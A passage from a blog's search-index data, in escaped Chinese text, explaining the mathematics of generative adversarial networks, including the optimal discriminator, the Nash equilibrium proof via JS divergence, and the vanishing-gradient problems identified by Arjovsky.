\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u4e86\u4e0a\u9762\u8fd9\u4e2a\u975e\u5e38\u4f18\u96c5\u7684\u76ee\u6807\u635f\u5931\u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u7ec3\u7684 minimax \u535a\u5f08\u5f0f\uff0c\u4f7f\u7528\u8fd9\u5957 Loss\uff0c\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\uff0cDiscriminator \u4f1a\u5c3d\u91cf\u7684\u6700\u5927\u5316\u771f\u5b9e\u6837\u4f8b\u7684\u8bc4\u5206\u671f\u671b\uff0c\u5e76\u6700\u5c0f\u5316\u751f\u6210\u7684\u6837\u4f8b\u7684\u8bc4\u5206\u671f\u671b\uff0c\u4ee5\u7b5b\u9009\u51fa\u5047\u56fe\u7247\uff1bGenerator \u5219\u5c3d\u91cf\u6700\u5927\u5316\u81ea\u5df1\u751f\u6210\u7684\u6837\u4f8b\u7684\u671f\u671b\u8bc4\u5206\uff0c\u8bd5\u56fe\u9a97\u8fc7 Discriminator\u3002\u5176\u57fa\u672c\u7684\u601d\u60f3\u6211\u4eec\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a generator \u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u662f\u91c7\u6837\u4e00\u4e2a\u566a\u97f3\u5411\u91cf z \u4f5c\u4e3a\u5176\u8f93\u5165\uff0cgenerator \u6839\u636e\u8fd9\u4e2a\u968f\u673a\u8f93\u5165\u751f\u6210\u4e00\u4e2a\u968f\u673a\u7279\u5f81\u7684\u56fe\u7247\u3002\u5f53\u6211\u4eec\u4f7f\u7528\u6ee1\u8db3\\(z\\sim p_z\\)\u7684\u968f\u673a\u566a\u97f3\u7684\u65f6\u5019\uff0c\u4e5f\u9690\u542b\u7684\u5b9a\u4e49\u4e86\u751f\u6210\u7684\u56fe\u7247\u7684\u5206\u5e03\\(p_g\\)\uff0c\u7406\u60f3\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u751f\u6210\u7684\u56fe\u7247\u5206\u5e03\u5c3d\u91cf\u6536\u655b\u4e8e\u8bad\u7ec3\u96c6\u4e2d\u56fe\u50cf\u7684\u6982\u7387\u5206\u5e03\\(p_{data}\\)\u3002</p> <p>Goodfellow \u5728 GAN \u7684\u5f00\u5c71\u4e4b\u4f5c\u4e2d\u8bc1\u660e\u4e86\u4e0a\u9762\u5f0f\u5b50\u4e2d\u5b9a\u4e49\u7684 minimax \u535a\u5f08\u5728\\(p_g=p_{data}\\)\u65f6\u53d6\u5f97\u7eb3\u4ec0\u5747\u8861\uff0c\u5e76\u4e14\u4f7f\u7528\u5176\u63d0\u51fa\u7684\u7b97\u6cd5\uff08\u5176\u5b9e\u5c31\u662f\u7528\u68af\u5ea6\u4e0b\u964d\u6700\u4f18\u5316\u4e0a\u8ff0\u76ee\u6807\u51fd\u6570\uff09\u53ef\u4ee5\u4f7f\u5f97\u535a\u5f08\u8fbe\u5230\u8fd9\u4e2a\u7eb3\u4ec0\u5747\u8861\uff0c\u56e0\u6b64\u4e5f\u5c31\u80fd\u8fbe\u5230\\(p_g = p_{data}\\)\u8fd9\u4e2a\u7f8e\u597d\u671f\u671b\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u7eb3\u4ec0\u5747\u8861\u70b9","title":"\u7eb3\u4ec0\u5747\u8861\u70b9","text":"<p>\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u6837\u672c x\uff0c\u5b83\u65e2\u6709\u53ef\u80fd\u6765\u81ea\u8bad\u7ec3\u96c6\uff0c\u53c8\u6709\u53ef\u80fd\u6765\u81ea\u751f\u6210\u5668\uff0c\u53ea\u4e0d\u8fc7\u662f\u6982\u7387\u5206\u5e03\u5b58\u5728\u5dee\u5f02\u7f62\u4e86\u3002\u8fd9\u4e2a\u6837\u672c\u5bf9\u4e8e\u4e0a\u9762\u5b9a\u4e49\u7684\u5224\u522b\u5668 D \u635f\u5931\u7684\u8d21\u732e\u4e3a\uff1a\\(-P_{data}(x)logD(x)-P_g(x)log[1-D(x)]\\)\u3002</p> <p>\u56fa\u5b9a generator \u7684\u53c2\u6570\uff0c\u4e0a\u5f0f\u5bf9 D \u6c42\u504f\u5bfc :</p> \\[ Dif=\\frac{-P_{data}(x)}{D(x)}+\\frac{P_g(x)}{1-D(x)} \\] <p>\u5bfc\u6570\u4e3a 0 \u65f6\uff0c\u5224\u522b\u5668\u7684\u635f\u5931\u53d6\u6700\u4f18\u503c\uff0c\u4e0d\u96be\u5bfc\u51fa\u6700\u4f18\u5224\u522b\u5668\uff1a</p> <p></p> <p>\u8fd9\u4e2a\u6700\u4f18\u5224\u522b\u5668\u7684\u76f4\u89c2\u610f\u4e49\u5f88\u663e\u7136\uff0c\u4e00\u4e2a\u6570\u636e x \u5728\u8bad\u7ec3\u96c6\u4e2d\u51fa\u73b0\u7684\u53ef\u80fd\u6027\u662f a\uff0c\u88ab\u751f\u6210\u5668\u751f\u6210\u7684\u6982\u7387\u662f b\uff0c\u90a3\u4e48\u5f53\u4e00\u4e2a\u6700\u4f18\u7684\u5224\u522b\u5668\u8981\u5224\u65ad\u5176\u5230\u5e95\u662f\u771f\u56fe\u7247\u8fd8\u662f\u5047\u56fe\u7247\u7684\u65f6\u5019\uff0c\u8f93\u51fa\u6982\u7387\\(\\frac{a}{a+b}\\)\u662f\u975e\u5e38\u81ea\u7136\u7684\u4e8b\u60c5\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u56fa\u5b9a\u7684 G\uff0cD \u80fd\u53d6\u5f97\u7684\u6700\u4f18\u5982\u4e0a\u3002\u90a3\u4e48\u8bf4\u767d\u4e86\uff0c\u8981\u6c42\u7eb3\u4ec0\u5747\u8861\uff0c\u4e5f\u5c31\u662f\u53ea\u9700\u8981\u518d\u8c03\u6574\u751f\u6210\u5668\u7684\u751f\u6210\u5206\u5e03 \\(p_g(x)\\) \u7684\uff0c\u4f7f\u5f97\u4e0a\u5f0f\u53d6\u6700\u5c0f\u3002</p> <p>\u539f\u8bba\u6587\u4e2d\u7ed9\u51fa\u4e86\u4e0b\u9762\u7684\u8bc1\u660e\u8fc7\u7a0b\uff0c\u8bc1\u660e\u4e86\\(p_g=p_{data}\\)\u65f6\uff0c\u53d6\u5f97\u7eb3\u4ec0\u5747\u8861\uff1a</p> <p></p> <p>\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86 KL \u6563\u5ea6\uff1a\\(KL(p||q)=\\int p(x)ln[\\frac {p(x)}{q(x)}]dx\\).</p> <p>\u539f\u8bba\u6587\u4e2d\u7ed9\u51fa\u7684\u8bc1\u660e\u5176\u5b9e\u5c31\u662f\u5bf9\u4e0a\u9762\u7684\\(C(G)\\)\u505a\u4e86\u4e00\u4e2a\u53d8\u6362\uff0c\u5c06\u5176\u53d8\u6362\u6210\u6563\u5ea6\u5f62\u5f0f\uff1a</p> \\[ \\int p_{data}(x)*log\\frac{p_{data}(x)}{p_{data}(x)+p_g(x)}*dx+\\int p_g(x)*log\\frac{p_g(x)}{p_{data}(x)+p_g(x)}*dx\\\\ =KL\uff08p_{data}||p_{data}+p_g\uff09+KL(p_g||p_{data}(x)+p_g(x)) \\] <p>log \u91cc\u9762\u5206\u6bcd\u518d\u9664\u4e2a 2\uff0c\u63d0\u51fa\u6765\u5c31\u662f\u5b83\u8bc1\u660e\u4e2d\u7684\u5f0f\u5b50\u4e86\uff1a</p> \\[ =KL\uff08p_{data}||\\frac{p_{data}+p_g}{2}\uff09+KL(p_g||\\frac{p_{data}+p_g}{2})-log(4) \\] <p>\u7136\u540e\u6211\u4eec\u5c31\u662f\u8981\u6700\u5c0f\u5316\u5b83\u5bf9\u5427\uff1f</p> <p>\u6211\u4eec\u5728\u4e0a\u9762\u4ecb\u7ecd KL \u6563\u5ea6\u7684\u65f6\u5019\uff0c\u5df2\u7ecf\u8bc1\u660e\u4e86\uff0cKL&gt;=0\uff0c\u5f53\u4e14\u4ec5\u5f53 p\uff0cq \u76f8\u7b49\u65f6\u53d6 0\uff0c\u6240\u4ee5\u4e0a\u5f0f\u53d6\u6700\u5c0f\u7684\u6761\u4ef6\u5c31\u662f\uff1a\\(p_{data}=\\frac{p_{data}+p_g}{2}=p_g&lt;=&gt;p_{data}=p_g\\)\u3002</p> <p>\u7531\u6b64\u5f97\u8bc1\u7eb3\u4ec0\u5747\u8861\u7684\u53d6\u5f97\u6761\u4ef6\u4e3a\\(p_{data}=p_g\\)\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u4f18\u5316\u7b97\u6cd5\u7684\u6536\u655b\u6027","title":"\u4f18\u5316\u7b97\u6cd5\u7684\u6536\u655b\u6027","text":"<p>\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c31\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e2a\u8bad\u7ec3\u7b97\u6cd5\uff0c\u5206\u522b\u8ba9 D \u548c G \u8f6e\u6d41\u9488\u5bf9 Loss \u505a\u68af\u5ea6\u4e0b\u964d\u800c\u5df2\uff0c\u76f4\u89c2\u4e0a\u5f88\u597d\u7406\u89e3\u3002Goodfellow \u5728\u539f\u8bba\u6587\u4e2d\u4e5f\u5bf9\u5176\u6536\u655b\u6027\u505a\u4e86\u8bc1\u660e\uff1a</p> <p></p> <p>\u5176\u5b9e\u611f\u89c9\u8bc1\u4e86\u8ddf\u6ca1\u8bc1\u5dee\u4e0d\u591a\u5427\u3002\u3002\u5927\u81f4\u5c31\u548c\u6211\u4eec\u5728\u4e4b\u524d\u8ba8\u8bba\u7684\u4e00\u6837\uff0c\u6700\u540e\u8981\u4f18\u5316\u7684\u672c\u8d28\u4e0a\u5c31\u662f\u4e00\u4e2a\u5173\u4e8e\\(p_g\\)\u7684\u51fd\u6570\uff0c\u7136\u540e\u8bc1\u660e\u4e86\u51f8\u6027\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u68af\u5ea6\u4e0b\u964d\u4fdd\u8bc1\u6536\u655b\u5230\u6700\u4f18\u70b9\u3002\u4f46\u662f\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0c\u6211\u4eec\u4e0d\u80fd\u8868\u793a\u4e3a\u4e00\u4e2a\\(p_g\\)\u7684\u51fd\u6570\uff0c\u800c\u662f\u7528\u591a\u5c42\u7f51\u7edc\u6765\u62df\u5408\uff0c\u867d\u7136\u7f3a\u4e4f\u7406\u8bba\u4fdd\u969c\uff0c\u4f46\u662f\u975e\u5e38\u6210\u529f\uff0c2333\u3002\u3002\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u539f\u8bba\u6587\u4e2d\uff0c\u8fd9\u4e00\u90e8\u5206\uff0c\u4e3b\u8981\u8fd8\u662f\u8bc1\u660e\u7eb3\u4ec0\u5747\u8861\u70b9\u7684\u90e8\u5206\u6700\u7cbe\u5f69\u3002\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u7528\u7c7b\u6bd4\u7684\u65b9\u6cd5\u89e3\u91ca\u4e86 GAN \u7684\u54f2\u5b66\uff0c\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4ece\u6570\u5b66\u4e0a\u8bc1\u660e\u4e86\u5b9a\u4e49\u7684 Loss \u7684\u5408\u7406\u6027\uff1a\u5728\u8fd9\u4e2a Loss \u5b9a\u4e49\u4e0b\uff0c\u6211\u4eec\u5b9e\u9645\u4e0a\u662f\u5728\u8ba9\u751f\u6210\u5668\u7684\u751f\u6210\u7ed3\u679c\u7684\u6982\u7387\u5206\u5e03\u548c\u6570\u636e\u96c6\u5206\u5e03\u62df\u5408\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u521d\u4ee3-gan-\u5b58\u5728\u7684\u95ee\u9898","title":"\u521d\u4ee3 GAN \u5b58\u5728\u7684\u95ee\u9898","text":"<p>\u4ece 14 \u5e74 GAN \u88ab\u63d0\u51fa\u4ee5\u6765\uff0cGAN \u5728\u5b9e\u8df5\u8fc7\u7a0b\u4e2d\uff0c\u5c31\u4e00\u76f4\u5b58\u5728\u8bad\u7ec3\u56f0\u96be\u7b49\u95ee\u9898\u3002</p> <p>\"However, they still remain remarkably difficult to train, with most current papers dedicated to heuristically finding stable architectures......Dispite their success, there is little to no theory explaining the unstable behaviour of GAN training.\"</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5927\u90e8\u5206\u5c1d\u8bd5\u90fd\u662f\u901a\u8fc7\u6539\u8fdb GAN \u7684\u751f\u6210\u5668\u548c\u5224\u522b\u5668\u7684\u67b6\u6784\uff0c\u6bd5\u7adf\u662f CNN\uff0c\u4f18\u5316\u4f18\u5316\u67b6\u6784\u603b\u80fd\u8ba9\u6027\u80fd\u63d0\u5347\u7684\u3002\u6bd4\u8f83\u6210\u529f\u7684\u5982 DCGAN\uff0c\u901a\u8fc7\u4e0d\u65ad\u5b9e\u9a8c\uff0c\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u7f51\u7edc\u67b6\u6784\u8bbe\u7f6e\u3002\u5b83\u4eec\u53d6\u5f97\u4e86\u4e00\u4e9b\u6210\u529f\uff0c\u4f46\u662f\u6ca1\u6709\u5f7b\u5e95\u89e3\u51b3 GAN \u5b58\u5728\u7684\u95ee\u9898\uff0c\u5e76\u4e14\u4e5f\u4e00\u76f4\u7f3a\u4e4f\u5bf9\u4e8e GAN \u7684\u8868\u73b0\u7684\u7406\u8bba\u89e3\u91ca\u3002</p> <p>\u4eba\u4eec\u53d1\u73b0\uff0c\u5728\u4f7f\u7528\u4e0a\u9762 Goodfellow \u63d0\u51fa\u7684\u90a3\u5957 minimax \u635f\u5931\u51fd\u6570\u8bad\u7ec3\u65f6\uff0c\u5224\u522b\u5668\u8bad\u7ec3\u5f97\u8d8a\u597d\uff0c\u751f\u6210\u5668\u68af\u5ea6\u6d88\u5931\u8d8a\u4e25\u91cd\u3002\u4e5f\u5c31\u662f\u8bf4\u5f53 discriminator \u592a\u5f3a\u7684\u65f6\u5019\uff0cgenerator \u7684\u80fd\u529b\u5c31\u8bad\u7ec3\u4e0d\u4e0a\u53bb\u4e86\u3002</p> <p>Goodfellow \u5f53\u5e74\u5728\u5199\u8fd9\u7bc7\u8bba\u6587\u7684\u65f6\u5019\u4e5f\u53d1\u73b0\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e8e\u662f\u5728\u4ecb\u7ecd\u5b8c\u81ea\u5df1\u6700\u5f00\u59cb\u63d0\u51fa\u7684\u90a3\u5957 Loss \u540e\uff0c\u53c8\u8865\u5145\u4e86\u51e0\u53e5\uff1a\"In practive, equation 1 may not provide sufficient gradient for G to learn will......Rather than training G to minimize log(1-D(G(z))) we can train G to maxmize log D(G(z)). This objective function results in the same fixed point of the dynamics of G and D but provides much stronger gradients early in learning.\"</p> <p>\u5176\u5b9e\u5c31\u662f\u628a generator \u7684\u76ee\u6807\u51fd\u6570\u7b80\u5355\u7684\u4ece log(1-D) \u6362\u6210\u4e86-log(D)\uff0c\u76f4\u89c2\u6765\u770b\uff0c\u610f\u4e49\u662f\u4e00\u6837\u7684\uff0c\u90fd\u662f\u5728\u5f15\u5bfc generator \u9a97\u8fc7 discriminator\uff0c\u53ea\u4e0d\u8fc7\u6570\u5b66\u5f62\u5f0f\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5728\u8bad\u7ec3\u7684\u65f6\u5019\u68af\u5ea6/\u6536\u655b\u7b49\u65b9\u9762\u53d1\u751f\u4e86\u53d8\u5316\u3002\u4f46\u662f\u540e\u6765\u4eba\u4eec\u53d1\u73b0\uff0c\u8fd9\u79cd\u505a\u6cd5\u4e5f\u5f88\u4e00\u822c\uff0c\u9996\u5148\u68af\u5ea6\u5f88\u4e0d\u7a33\u5b9a\uff0c\u5176\u6b21\u751f\u6210\u7684\u6837\u672c\u591a\u6837\u6027\u4e0d\u8db3\u3002</p> <p>\u76f4\u5230 2017 \u5e74\uff0c\u8fd9\u4f4d\u6765\u81ea Courant Institute of Mathematical Sciences \u7684 Martin Arjovsky \u5148\u751f\u53d1\u8868\u4e86\u6587\u7ae0\u5f00\u5934\u63d0\u5230\u7684\u300aTOWARDS PRINCIPLED METHODS FOR TRAINING GENERATIVE ADVERSARIAL NETWORKS\u300b(Arjovsky et al. 2017) \uff0c\u5176\u4e2d\u5b58\u5728\u7684\u7406\u8bba\u95ee\u9898\u624d\u5f97\u5230\u4e86\u56de\u7b54\u3002</p> <p>\u539f\u6587\u4e2d\u5bf9\u4e8e\u8fd9\u90e8\u5206\u95ee\u9898\u7684\u5f52\u7eb3\u5f97\u975e\u5e38\u7cbe\u5f69\uff1a</p> <p></p> <p>\u5be5\u5be5\u51e0\u53e5\u8bdd\uff0c\u5c31\u628a\u524d\u4eba\u9047\u5230\u7684\u95ee\u9898\u7684\u8981\u5bb3\u7ed9\u6293\u4f4f\u4e86\uff1a\u65e2\u7136 D \u6700\u4f18\u7684\u65f6\u5019\uff0c\u8bad\u7ec3 G \u5c31\u80fd\u903c\u8fd1\u7eb3\u4ec0\u5747\u8861\uff0c\u4e3a\u5565 D \u8d8a\u597d\uff0cG \u7684\u8bad\u7ec3\u5374\u8d8a\u7cdf\u7cd5\uff1fGoodfellow \u8bf4\u8fd9\u662f\u56e0\u4e3a saturation \u5bfc\u81f4\u7684\uff0c\u53ef\u4ee5\u6362\u4e2a loss function\uff0c\u4f46\u662f\u4e3a\u5565\u6362\u4e86\u8fc7\u540e\u53d1\u73b0\u66f4\u5783\u573e\u4e86\u3002</p> <p>\u4e8e\u662f\u63d0\u51fa\u4e86\u56db\u4e2a\u7cbe\u9ad3\u7684\u95ee\u9898\uff1a\u4e3a\u5565 D \u8d8a\u597d\uff0cG \u8bad\u7ec3\u8d8a\u5dee\uff1f\u4e3a\u4ec0\u4e48 GAN \u7684\u8bad\u7ec3\u4e0d\u7a33\u5b9a\uff1fGoodfellow \u63d0\u51fa\u7684\u66ff\u4ee3\u9009\u9879\u4e5f\u548c JSD \u6709\u5173\u4e48\uff0c\u6027\u8d28\u5982\u4f55\uff1f\u6709\u4ec0\u4e48\u89e3\u51b3\u5f53\u4e0b\u95ee\u9898\u7684\u529e\u6cd5\u5417\uff1f</p> <p>\u95ee\u5b8c\u540e\uff0c\u5938\u4e0b\u6d77\u53e3\uff1aThe fundamental contributions of this paper are the answer to all these questions. \u53ef\u8c13\u662f\u6280\u60ca\u56db\u5ea7\u3002\u3002\u3002</p> <p>\u8fd9\u90e8\u5206\uff0c\u6211\u4eec\u4e3b\u8981\u6574\u7406\u4e86 Arjovsky \u8fd9\u7bc7\u8bba\u6587\u4e2d\u7684\u5173\u4e8e\u521d\u4ee3 GAN \u5b58\u5728\u7684\u95ee\u9898\u7684\u90e8\u5206\u5206\u6790\u548c\u63a8\u7406\u3002\u6211\u4eec\u5c06\u5206\u4e24\u4e2a\u90e8\u5206\u5206\u522b\u8ba8\u8bba Goodfellow \u539f\u8bba\u6587\u4e2d\u63d0\u51fa\u7684\u4e24\u79cd\u5f62\u5f0f\u7684 Generator \u76ee\u6807\u51fd\u6570\u5b58\u5728\u7684\u95ee\u9898\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u53ea\u4f1a\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684 intuition \u5c42\u6b21\u4e0a\u7684\u8ba8\u8bba\uff0c\u4e25\u683c\u7684\u6570\u5b66\u63a8\u5bfc\u8bfb\u8005\u53ef\u4ee5\u81ea\u884c\u4e0b\u8f7d\u8bba\u6587\u67e5\u770b\u3002\u56e0\u4e3a\uff0c\u8fd9\u4f4d\u6570\u5b66\u7814\u7a76\u6240\u7684\u5927\u54e5\uff0c\u5199\u7684\u8bba\u6587\u3002\u3002\u3002\u55ef\u3002\u3002\u3002</p> <p>\u975e\u5e38\u4e25\u8c28\uff1a</p> <p></p> <p>\u8981\u5403\u4e0b\u8fd9\u7bc7\u8bba\u6587\uff0c\u6700\u597d\u5f97\u6709\u4e00\u70b9\u6d4b\u5ea6\u8bba\u7684\u57fa\u7840\u3002\uff08\u53cd\u6b63\u6211\u4e0d\u4f1a\uff09</p> <p>\u81f3\u4e8e\u4ed6\u5728\u8fd9\u7bc7\u8bba\u6587\u4e2d\u63d0\u51fa\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u518d\u8ba8\u8bba\uff0c\u56e0\u4e3a\u4e0b\u4e00\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u4f1a\u4ecb\u7ecd\u4e00\u4e2a\u66f4\u52a0\u6210\u719f\u7684\u65b9\u6cd5\u2014\u2014WGAN\u3002\u800c\u63d0\u51fa\u8005\u3002\u3002\u3002\u8fd8\u662f\u8fd9\u4f4d Arjovsky \u5148\u751f\u3002\u3002\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#log1-d-\u5b58\u5728\u7684\u95ee\u9898","title":"log(1-D) \u5b58\u5728\u7684\u95ee\u9898","text":"<p>\u5728\u4e0a\u9762\u8bc1\u660e GAN \u7684\u7eb3\u4ec0\u5747\u8861\u70b9\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u5f53 Discriminator \u6700\u4f18\u65f6\uff0c\u6700\u4f18\u5316 Generator \u76ee\u6807\u51fd\u6570\u7684\u7b49\u4ef7\u8868\u8fbe\u5f0f\uff1a</p> \\[ KL\uff08p_{data}||\\frac{p_{data}+p_g}{2}\uff09+KL(p_g||\\frac{p_{data}+p_g}{2})-log(4)\\\\ =2JSD(p_{data}||p_g)-log(4) \\] <p>\u6700\u5c0f\u5316\u8fd9\u4e2a\u76ee\u6807\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u5316\\(p_{data}\\)\u548c\\(p_g\\)\u7684\u6563\u5ea6\uff0c\u4e5f\u5c31\u662f\u5c3d\u91cf\u8ba9\u4e24\u4e2a\u5206\u5e03\u8d34\u5408\uff0c\u4e24\u8005\u76f8\u7b49\u65f6\u8fbe\u5230\u7eb3\u4ec0\u5747\u8861\uff0c\u8fd9\u4e9b\u6211\u4eec\u90fd\u5df2\u7ecf\u8ba8\u8bba\u8fc7\u4e86\u3002</p> <p>\u4f46\u662f\u95ee\u9898\u5c31\u51fa\u5728\u8fd9\u4e2a\u6563\u5ea6\u4e0a\u3002</p> <p>\u5982\u679c\u5728\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\\(p_{data}\\)\u548c\\(p_g\\)\u8fd9\u4e24\u4e2a\u5206\u5e03\u5b8c\u5168\u4e0d\u91cd\u53e0\uff0c\u6216\u8005\u91cd\u53e0\u90e8\u5206\u53ef\u5ffd\u7565\uff0c\u90a3\u4e48\u8fd9\u4e2a JS \u6563\u5ea6\u4f1a\u662f\u591a\u5c11\u5462\uff1f</p> <p>\uff08\u8fd9\u91cc\u7684\u91cd\u53e0\u6307\uff1a\u4e24\u4e2a\u5206\u5e03\u5728\u67d0\u4e2a\u6837\u672c\u70b9\u4e0a\u90fd\u6709\u4e0d\u4e3a 0 \u7684\u51fa\u73b0\u6982\u7387\u3002\uff09</p> <p>\u8fd8\u662f\u5148\u8003\u8651\u5355\u4e2a x \u5bf9\u8fd9\u4e2a JSD \u7684\u8d21\u732e\uff1a</p> \\[ [p_{data}(x)*log\\frac{2p_{data}(x)}{p_{data}(x)+p_g(x)}+p_g(x)*log\\frac{2p_g(x)}{p_{data}(x)+p_g(x)}]dx \\] <p>\u5bf9\u4e8e\u6bcf\u4e2a x \u6765\u8bf4\uff0c\u5b58\u5728\u56db\u79cd\u53ef\u80fd\u6027\uff1a</p> \\[ p_{data}(x)=0\uff0cp_g(x)=0\\\\ p_{data}(x)\\neq0\uff0cp_g(x)=0\\\\ p_{data}(x)=0\uff0cp_g(x)\\neq0\\\\ p_{data}(x)\\neq0\uff0cp_g(x)\\neq0\\\\ \\] <p>\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u5bf9\u6563\u5ea6\u65e0\u8d21\u732e\uff0c\u7b2c\u4e8c\u79cd\u60c5\u51b5\u548c\u7b2c\u4e09\u79cd\u60c5\u51b5\u5219\u4f1a\u8d21\u732e log2*dx\u3002\u7531\u4e8e\u5b8c\u5168\u4e0d\u91cd\u53e0\u6216\u8005\u91cd\u53e0\u5ffd\u7565\u4e0d\u8ba1\uff0c\u7b2c\u56db\u79cd\u60c5\u51b5\u8d21\u732e\u4e5f\u53ef\u7b97\u4f5c 0\u3002\u56e0\u6b64\uff0c\u5b9e\u9645\u4e0a\uff0c\u5728\\(p_{data}\u548c p_g\\)\u91cd\u53e0\u91cf\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a JS \u6563\u5ea6\u59cb\u7ec8\u5728 log2 \u9644\u8fd1\u8f7b\u5fae\u9707\u52a8\u3002\u4f7f\u7528\u8fd9\u6837\u7684 loss function \u6765\u8bad\u7ec3 generator\uff0c\u5176\u5b9e\u5c31\u610f\u5473\u7740\uff1a\u68af\u5ea6=0\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53 discriminator \u6700\u4f18\u7684\u65f6\u5019\uff0c\u5982\u679c\u751f\u6210\u5668\u4ea7\u751f\u7ed3\u679c\u7684\u5206\u5e03\\(p_g\\)\u4e0e\u8bad\u7ec3\u96c6\u5206\u5e03\\(p_{data}\\)\u7684\u91cd\u53e0\u91cf\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\uff0cgenerator \u4e0d\u80fd\u83b7\u5f97\u4efb\u4f55\u68af\u5ea6\u4fe1\u606f\uff08\u56e0\u4e3a\u68af\u5ea6=0\uff09\uff0c\u65e0\u6cd5\u901a\u8fc7\u68af\u5ea6\u6765\u4f18\u5316\u81ea\u5df1\u3002</p> <p>\u800c\\(p_{data}\\)\u548c\\(p_d\\)\u91cd\u53e0\u91cf\u53ef\u5ffd\u7565\u4e0d\u8ba1\u7684\u6982\u7387\u662f\u591a\u5927\u5462\uff1f\u51e0\u4e4e\u662f 1..</p> <p></p> <p></p> <p>\u539f\u8bba\u6587\u7528\u6d4b\u5ea6\u8bba\u7684\u65b9\u6cd5\u8bc1\u660e\u4e86\uff1a\u5f53\\(p_{data}\u548c p_g\\)\u7684\u652f\u6491\u96c6\u662f\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u7684\u4f4e\u7ef4\u6d41\u884c\u65f6\uff0c\u8fd9\u4e24\u4e2a\u5206\u5e03\u91cd\u53e0\u90e8\u5206\u7684\u6d4b\u5ea6\u4e3a 0 \u7684\u6982\u7387\u4e3a 1\u3002</p> <p>\u8fd9\u91cc\u7b80\u5355\u89e3\u91ca\u4e00\u4e0b\u6982\u5ff5\uff1a</p> <ul> <li>\u652f\u6491\u96c6\uff1a\u4e00\u4e2a\u51fd\u6570\u5728\u5176\u5b9a\u4e49\u57df\u4e0a\u53d6\u503c\u975e 0 \u7684\u5b9a\u4e49\u70b9\u7684\u70b9\u96c6\u3002</li> <li>\u6d41\u5f62\uff1a\u4e09\u7ef4\u7a7a\u95f4\u4e2d\u6211\u4eec\u6709\u66f2\u7ebf\uff0c\u66f2\u9762\u3002\u8fd9\u4e9b\u4f4e\u7ef4\u66f2\u7ebf/\u66f2\u9762\u90fd\u662f\u8fd9\u4e2a\u4e09\u7ef4\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u4f4e\u7ef4\u6d41\u5f62\u3002\u6bd4\u5982\u4e00\u4e09\u7ef4\u7a7a\u95f4\u4e2d\u7684\u66f2\u9762\u662f\u8fd9\u4e2a\u7a7a\u95f4\u4e2d\u7684\u4e00\u4e2a\u4e8c\u7ef4\u6d41\u5f62\uff0c\u66f2\u7ebf\u662f\u4e00\u4e2a\u4e00\u7ef4\u6d41\u5f62\u3002\u672c\u8d28\u4e0a\uff0c\u6211\u4eec\u77e5\u9053\uff0c\u6240\u8c13\u7ef4\u5ea6\u5c31\u662f\u6307\u9700\u8981\u51e0\u4e2a\u53d8\u91cf\u624d\u80fd\u786e\u5b9a\uff0c\u6d41\u5f62\u5c31\u662f\u9ad8\u7ef4\u7a7a\u95f4\u4e2d\u8fd9\u4e9b\u6982\u5ff5\u7684\u63a8\u5e7f\u3002</li> 